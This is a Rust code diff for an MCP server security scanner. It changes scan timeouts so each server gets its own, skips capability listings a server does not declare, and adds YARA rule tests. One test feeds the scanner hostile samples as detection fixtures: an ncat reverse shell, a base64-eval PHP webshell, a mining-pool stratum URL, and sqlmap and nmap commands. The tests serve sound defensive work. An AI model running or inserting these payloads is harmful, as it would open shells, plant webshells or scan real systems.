-                                Ok(mut result) => {
-                                    result.ide_source = Some(ide_source);
-                                    // Append pre-config YARA/heuristic/baseline findings if any
-                                    attach_findings(&mut result);
-                                    result
+                        // Give each server its own slice of the budget rather
+                        // than sharing one global deadline. A global
+                        // `timeout(join_all(..))` consumes the join handles, so
+                        // one slow server discarded every other server's
+                        // completed result and the scan still reported success.
+                        // Per-task means join_all always returns one entry per
+                        // server, and a timeout names the server it belongs to.
+                        let timeout_label = server.to_display_url();
+                        let timeout_ide_source = ide_source.clone();
+                        let timeout_server_name = server.name.clone();
+
+                        let scan_future = async {
+                            // Scan the MCP server - HTTP or STDIO
+                            let mut result = if let Some(url) = server.scan_url() {
+                                // HTTP server scanning
+                                match scanner.scan_single(url, server_options).await {
+                                    Ok(mut result) => {
+                                        result.ide_source = Some(ide_source);
+                                        // Append pre-config YARA/heuristic/baseline findings if any
+                                        attach_findings(&mut result);
+                                        result
+                                    }
+                                    Err(e) => {
+                                        let mut failed_result = ScanResult::new(url.to_string());
+                                        failed_result.status = ScanStatus::Failed(e.to_string());
+                                        failed_result.ide_source = Some(ide_source);
+                                        attach_findings(&mut failed_result);
+                                        failed_result
+                                    }
                                 }
-                                Err(e) => {
-                                    let mut failed_result = ScanResult::new(url.to_string());
-                                    failed_result.status = ScanStatus::Failed(e.to_string());
-                                    failed_result.ide_source = Some(ide_source);
-                                    attach_findings(&mut failed_result);
-                                    failed_result
+                            } else if server.command.is_some() {
+                                // STDIO server scanning
+                                match scanner.scan_stdio_server(&server, server_options).await {
+                                    Ok(mut result) => {
+                                        result.ide_source = Some(ide_source);
+                                        attach_findings(&mut result);
+                                        result
+                                    }
+                                    Err(e) => {
+                                        let mut failed_result =
+                                            ScanResult::new(server.to_display_url());
+                                        failed_result.status = ScanStatus::Failed(e.to_string());
+                                        failed_result.ide_source = Some(ide_source);
+                                        attach_findings(&mut failed_result);
+                                        failed_result
+                                    }
                                 }
-                            }
-                        } else if server.command.is_some() {
-                            // STDIO server scanning
-                            match scanner.scan_stdio_server(&server, server_options).await {
-                                Ok(mut result) => {
-                                    result.ide_source = Some(ide_source);
-                                    attach_findings(&mut result);
-                                    result
-                                }
-                                Err(e) => {
-                                    let mut failed_result =
-                                        ScanResult::new(server.to_display_url());
-                                    failed_result.status = ScanStatus::Failed(e.to_string());
-                                    failed_result.ide_source = Some(ide_source);
-                                    attach_findings(&mut failed_result);
-                                    failed_result
-                                }
-                            }
-                        } else {
-                            // Invalid server configuration
-                            let mut failed_result = ScanResult::new("unknown".to_string());
-                            failed_result.status =
-                                ScanStatus::Failed("Invalid server configuration".to_string());
-                            failed_result.ide_source = Some(ide_source);
-                            attach_findings(&mut failed_result);
-                            failed_result
+                            } else {
+                                // Invalid server configuration
+                                let mut failed_result = ScanResult::new("unknown".to_string());
+                                failed_result.status =
+                                    ScanStatus::Failed("Invalid server configuration".to_string());
+                                failed_result.ide_source = Some(ide_source);
+                                attach_findings(&mut failed_result);
+                                failed_result
+                            };
+
+                            // Clone rather than move: the enclosing async
+                            // block still borrows `server`.
+                            result.server_name = server.name.clone();
+                            result
                         };
 
-                        result
+                        match tokio::time::timeout(
+                            Duration::from_secs(PER_SERVER_SCAN_BUDGET_SECS),
+                            scan_future,
+                        )
+                        .await
+                        {
+                            Ok(result) => result,
+                            Err(_) => {
+                                warn!(
+                                    "Scan of {} exceeded the {}s budget",
+                                    timeout_label, PER_SERVER_SCAN_BUDGET_SECS
+                                );
+                                let mut timed_out = ScanResult::new(timeout_label);
+                                timed_out.status = ScanStatus::Timeout;
+                                timed_out.add_error(format!(
+                                    "Scan did not finish within {PER_SERVER_SCAN_BUDGET_SECS}s"
+                                ));
+                                timed_out.ide_source = Some(timeout_ide_source);
+                                timed_out.server_name = timeout_server_name;
+                                timed_out
+                            }
+                        }
                     })
                 })
                 .collect();
@@ -1753,16 +2223,9 @@ impl MCPScanner {
                 scan_tasks.len()
             );
 
-            // Add timeout to prevent tasks from hanging indefinitely
-            let scan_results = tokio::time::timeout(
-                std::time::Duration::from_secs(300), // 5 minute timeout for all tasks
-                join_all(scan_tasks),
-            )
-            .await
-            .unwrap_or_else(|_| {
-                warn!("Parallel scan tasks timed out after 5 minutes");
-                vec![] // Return empty results if timeout
-            });
+            // Every task carries its own timeout now, so this always returns
+            // one entry per server and no completed scan is ever discarded.
+            let scan_results = join_all(scan_tasks).await;
 
             // Extract results from join handles
             for task_result in scan_results {
@@ -1951,32 +2414,42 @@ impl MCPScanner {
                 }
             };
 
-        scan_data.resources = match self.mcp_client.list_resources(&session).await {
-            Ok(resources) => {
-                debug!(
-                    "Successfully fetched {} resources via rmcp",
-                    resources.len()
-                );
-                resources
-            }
-            Err(e) => {
-                let error_msg = format!("Failed to fetch resources via rmcp: {e}");
-                warn!("{}", error_msg);
-                fetch_errors.push(error_msg);
-                Vec::new()
+        scan_data.resources = if !server_declares(session.server_info.as_ref(), "resources") {
+            debug!("Server did not declare the resources capability; skipping resources/list");
+            Vec::new()
+        } else {
+            match self.mcp_client.list_resources(&session).await {
+                Ok(resources) => {
+                    debug!(
+                        "Successfully fetched {} resources via rmcp",
+                        resources.len()
+                    );
+                    resources
+                }
+                Err(e) => {
+                    let error_msg = format!("Failed to fetch resources via rmcp: {e}");
+                    warn!("{}", error_msg);
+                    fetch_errors.push(error_msg);
+                    Vec::new()
+                }
             }
         };
 
-        scan_data.prompts = match self.mcp_client.list_prompts(&session).await {
-            Ok(prompts) => {
-                debug!("Successfully fetched {} prompts via rmcp", prompts.len());
-                prompts
-            }
-            Err(e) => {
-                let error_msg = format!("Failed to fetch prompts via rmcp: {e}");
-                warn!("{}", error_msg);
-                fetch_errors.push(error_msg);
-                Vec::new()
+        scan_data.prompts = if !server_declares(session.server_info.as_ref(), "prompts") {
+            debug!("Server did not declare the prompts capability; skipping prompts/list");
+            Vec::new()
+        } else {
+            match self.mcp_client.list_prompts(&session).await {
+                Ok(prompts) => {
+                    debug!("Successfully fetched {} prompts via rmcp", prompts.len());
+                    prompts
+                }
+                Err(e) => {
+                    let error_msg = format!("Failed to fetch prompts via rmcp: {e}");
+                    warn!("{}", error_msg);
+                    fetch_errors.push(error_msg);
+                    Vec::new()
+                }
             }
         };
 
@@ -2088,35 +2561,45 @@ impl MCPScanner {
                 }
             };
 
-        scan_data.resources = match self.mcp_client.list_resources(session).await {
-            Ok(resources) => {
-                debug!(
-                    "Successfully fetched {} resources from session",
-                    resources.len()
-                );
-                resources
-            }
-            Err(e) => {
-                let error_msg = format!("Failed to fetch resources from session: {e}");
-                warn!("{}", error_msg);
-                fetch_errors.push(error_msg);
-                Vec::new()
+        scan_data.resources = if !server_declares(session.server_info.as_ref(), "resources") {
+            debug!("Server did not declare the resources capability; skipping resources/list");
+            Vec::new()
+        } else {
+            match self.mcp_client.list_resources(session).await {
+                Ok(resources) => {
+                    debug!(
+                        "Successfully fetched {} resources from session",
+                        resources.len()
+                    );
+                    resources
+                }
+                Err(e) => {
+                    let error_msg = format!("Failed to fetch resources from session: {e}");
+                    warn!("{}", error_msg);
+                    fetch_errors.push(error_msg);
+                    Vec::new()
+                }
             }
         };
 
-        scan_data.prompts = match self.mcp_client.list_prompts(session).await {
-            Ok(prompts) => {
-                debug!(
-                    "Successfully fetched {} prompts from session",
-                    prompts.len()
-                );
-                prompts
-            }
-            Err(e) => {
-                let error_msg = format!("Failed to fetch prompts from session: {e}");
-                warn!("{}", error_msg);
-                fetch_errors.push(error_msg);
-                Vec::new()
+        scan_data.prompts = if !server_declares(session.server_info.as_ref(), "prompts") {
+            debug!("Server did not declare the prompts capability; skipping prompts/list");
+            Vec::new()
+        } else {
+            match self.mcp_client.list_prompts(session).await {
+                Ok(prompts) => {
+                    debug!(
+                        "Successfully fetched {} prompts from session",
+                        prompts.len()
+                    );
+                    prompts
+                }
+                Err(e) => {
+                    let error_msg = format!("Failed to fetch prompts from session: {e}");
+                    warn!("{}", error_msg);
+                    fetch_errors.push(error_msg);
+                    Vec::new()
+                }
             }
         };
 
@@ -2178,27 +2661,37 @@ impl Clone for MCPScanner {
     }
 }
 
-// Scan data
-pub(crate) struct ScanData {
+/// Intermediate data produced by the MCP probe step before analysis runs.
+///
+/// Made `pub` (was `pub(crate)`) and serializable so external callers can
+/// drive the analyze-only path via `POST /v1/ramparts/analyze`:
+/// they hand us this struct (typically obtained by their own listing of
+/// the upstream MCP server) and we run the same security analysis stages
+/// the live-scan path uses.
+///
+/// `#[serde(default)]` keeps the JSON wire format forgiving: clients may
+/// omit any collection or `server_info` and the corresponding field
+/// defaults to empty / None.
+#[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
+pub struct ScanData {
+    #[serde(default)]
     pub server_info: Option<MCPServerInfo>,
+    #[serde(default)]
     pub tools: Vec<MCPTool>,
+    #[serde(default)]
     pub resources: Vec<MCPResource>,
+    #[serde(default)]
     pub prompts: Vec<MCPPrompt>,
+    #[serde(default)]
     pub yara_results: Vec<YaraScanResult>,
+    #[serde(default)]
     pub fetch_errors: Vec<String>,
 }
 
 // Scan data implementation
 impl ScanData {
-    fn new() -> Self {
-        Self {
-            server_info: None,
-            tools: Vec::new(),
-            resources: Vec::new(),
-            prompts: Vec::new(),
-            yara_results: Vec::new(),
-            fetch_errors: Vec::new(),
-        }
+    pub fn new() -> Self {
+        Self::default()
     }
 }
 
@@ -2477,6 +2970,96 @@ mod tests {
             // Real YARA-X may or may not have matches depending on rule content
             // Just verify we got a valid result (empty or with matches)
         }
+    }
+
+    /// The rule-identifier → file-stem map is built at load time from the
+    /// compiled rules, so every .yar file in rules/pre is covered without
+    /// a hand-maintained name table. One representative rule per file
+    /// guards against a file silently failing to compile (the loader
+    /// warns and skips on compile errors instead of failing the load).
+    #[test]
+    #[cfg(feature = "yara-x-scanning")]
+    fn test_rule_file_map_covers_all_pre_rule_files() {
+        let scanner = ThreatRules::new("rules")
+            .expect("Should be able to create ThreatRules with rules directory");
+
+        for (rule_identifier, file_stem) in [
+            ("SecretsLeakage", "secrets_leakage"),
+            ("CommandInjection", "command_injection"),
+            ("SQLInjection", "sql_injection"),
+            ("PathTraversalVulnerability", "path_traversal"),
+            ("MCPConfigRisk", "mcp_config_risk"),
+            ("CrossOriginEscalation", "cross_origin_escalation"),
+            ("PromptInjectionSignature", "skill_prompt_injection"),
+            ("AutonomyAbuse", "skill_authority"),
+            ("SkillCredentialHarvesting", "skill_credential_harvesting"),
+            ("SkillToolChainingExfiltration", "skill_tool_chaining_abuse"),
+            ("SkillSystemManipulation", "skill_system_manipulation"),
+            ("CryptoStratumProtocol", "cryptominers"),
+            ("ReverseShell", "malware"),
+            ("PHPWebshellGeneric", "webshells"),
+            ("OffensiveToolReferences", "hacktools"),
+        ] {
+            assert_eq!(
+                scanner.rule_file_for(rule_identifier),
+                Some(file_stem.to_string()),
+                "rule {rule_identifier} should map to file {file_stem}"
+            );
+        }
+
+        // Synthetic findings never go through the YARA scan path and are
+        // intentionally absent from the map.
+        assert_eq!(scanner.rule_file_for("MCPConfigChanged"), None);
+    }
+
+    /// Loads the real shipped `rules/pre` files and confirms they fire on
+    /// known-malicious payloads. The other YARA tests scan inline synthetic
+    /// rules, so they prove the engine works but not that the shipped rule
+    /// content is correct — a broken regex in e.g. `cryptominers.yar` would
+    /// pass every other test. This guards the rule bodies themselves, with
+    /// extra coverage for the ported SkillSpector-derived rules.
+    #[test]
+    #[cfg(feature = "yara-x-scanning")]
+    fn test_shipped_pre_rules_fire_on_malicious_payloads() {
+        let scanner = ThreatRules::new("rules")
+            .expect("Should be able to create ThreatRules with rules directory");
+
+        // (payload, rule identifier that must appear in the matches)
+        let cases = [
+            (
+                "stratum+tcp://pool.minexmr.com:4444 -u WALLET -p x",
+                "CryptoStratumProtocol",
+            ),
+            ("pool: pool.minexmr.com", "CryptoMiningPools"),
+            (
+                "<?php eval(base64_decode($_POST['cfg'])); ?>",
+                "PHPWebshellObfuscated",
+            ),
+            ("ncat 10.0.0.5 4444 -e /bin/bash", "ReverseShell"),
+            ("sqlmap --url http://x --dump", "OffensiveToolReferences"),
+            ("nmap -sS 10.0.0.0/24", "NetworkReconnaissance"),
+        ];
+
+        for (payload, expected_rule) in cases {
+            let matches = scanner.pre_scan(payload, "test");
+            assert!(
+                matches.iter().any(|m| m.rule_name == expected_rule),
+                "payload {payload:?} should trigger {expected_rule}; got: {:?}",
+                matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
+            );
+        }
+
+        // Benign skill prose must not trip any pre-scan rule.
+        let benign = "This skill helps you format markdown tables and tidy whitespace.";
+        let benign_matches = scanner.pre_scan(benign, "test");
+        assert!(
+            benign_matches.is_empty(),
+            "benign text should not match any rule; got: {:?}",
+            benign_matches
+                .iter()
+                .map(|m| &m.rule_name)
+                .collect::<Vec<_>>()
+        );
     }
 
     #[test]
